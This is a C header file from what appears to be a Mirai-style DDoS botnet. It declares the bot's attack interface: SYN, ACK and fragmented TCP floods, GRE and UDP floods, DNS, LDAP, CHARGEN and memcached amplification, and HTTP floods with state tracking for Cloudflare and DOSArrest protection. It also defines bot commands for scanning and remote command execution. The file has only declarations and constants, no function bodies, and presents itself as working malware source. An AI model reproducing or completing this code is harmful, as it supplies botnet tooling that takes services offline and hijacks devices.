#pragma once
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include "includes.h"
#include "protocol.h"
#define ATTACK_CONCURRENT_MAX   15

#ifdef DEBUG
#define HTTP_CONNECTION_MAX     1000
#else
#define HTTP_CONNECTION_MAX     256
#endif

struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};
struct attack_option {
    char *val;
    uint8_t key;
};
typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;
#define ATK_VEC_SYN        0
#define ATK_VEC_ACK        1
#define ATK_VEC_USYN       2
#define ATK_VEC_TCPALL     3
#define ATK_VEC_TCPFRAG    4
#define ATK_VEC_ASYN       5
#define ATK_VEC_GAME       6
#define ATK_VEC_UDPPLAIN   7
#define ATK_VEC_HTTP       8
#define ATK_VEC_GREIP      9
#define ATK_VEC_STD       10
#define ATK_VEC_ORBITV3   11
#define ATK_VEC_SOCKET    12
#define ATK_VEC_NFOLAG    14
#define ATK_VEC_CUDP      15
#define ATK_VEC_MPTCPGRE  16
#define ATK_VEC_GREETH    17
#define ATK_VEC_GRESTACK  18
#define ATK_VEC_CONNECT   19
#define ATK_VEC_DNS       20
#define ATK_VEC_LDAP      21
#define ATK_VEC_CHARGEN   22
#define ATK_VEC_MEMCACHED 23
#define ATK_VEC_UDPX      24
#define ATK_VEC_ATTACK_STOP 251
#define ATK_VEC_SCAN_START  252
#define ATK_VEC_SCAN_STOP   253
#define ATK_VEC_SCANPORTS  254
#define ATK_VEC_EXEC       255

#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_DNS_HDR_ID      9
#define ATK_OPT_URG             11
#define ATK_OPT_ACK             12
#define ATK_OPT_PSH             13
#define ATK_OPT_RST             14
#define ATK_OPT_SYN             15
#define ATK_OPT_FIN             16
#define ATK_OPT_SEQRND          17
#define ATK_OPT_ACKRND          18
#define ATK_OPT_GRE_CONSTIP     19
#define ATK_OPT_METHOD			20
#define ATK_OPT_POST_DATA		21
#define ATK_OPT_PATH            22
#define ATK_OPT_HTTPS           23
#define ATK_OPT_CONNS           24
#define ATK_OPT_SOURCE          25
#define ATK_OPT_BURST           26
#define ATK_OPT_PORTS           27
#define ATK_OPT_USYN            28
#define ATK_OPT_FLOOD           30
#define ATK_OPT_STREAM          31
#define ATK_OPT_WINDOW          32
#define ATK_OPT_CONN_SNDBUF     33
#define ATK_OPT_CONN_RCVBUF     34
#define ATK_OPT_CMD             29

#define HTTP_CONN_INIT          0
#define HTTP_CONN_RESTART       1
#define HTTP_CONN_CONNECTING    2
#define HTTP_CONN_HTTPS_STUFF   3
#define HTTP_CONN_SEND          4
#define HTTP_CONN_SEND_HEADERS  5
#define HTTP_CONN_RECV_HEADER   6
#define HTTP_CONN_RECV_BODY     7
#define HTTP_CONN_SEND_JUNK		8
#define HTTP_CONN_SNDBUF_WAIT   9
#define HTTP_CONN_QUEUE_RESTART 10
#define HTTP_CONN_CLOSED        11

#define HTTP_RDBUF_SIZE         1024
#define HTTP_HACK_DRAIN         64
#define HTTP_PATH_MAX           256
#define HTTP_DOMAIN_MAX         128
#define HTTP_COOKIE_MAX         5
#define HTTP_COOKIE_LEN_MAX     128
#define HTTP_POST_MAX           512

#define HTTP_PROT_DOSARREST     1
#define HTTP_PROT_CLOUDFLARE    2


struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};


struct attack_http_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char path[HTTP_PATH_MAX + 1];
    char domain[HTTP_DOMAIN_MAX + 1];
    char postdata[HTTP_POST_MAX + 1];
    char method[9];
    char orig_method[9];

    int protection_type;

    int keepalive;
    int chunked;
    int content_length;

    int num_cookies;
    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];

    int rdbuf_pos;
    char rdbuf[HTTP_RDBUF_SIZE];
};

struct attack_cfnull_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char domain[HTTP_DOMAIN_MAX + 1];
    int to_send;
};



BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
void attack_method_tcpsyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpusyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpall(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_asyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpgame(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_proxy(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_greip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_orbitv3(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_socket(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_nfolag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_cudp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_mptcpgre(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_greeth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_grestack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_connect(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_ldap(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_chargen(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_memcached(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpx(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

BOOL attack_raw_capable(void);

void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
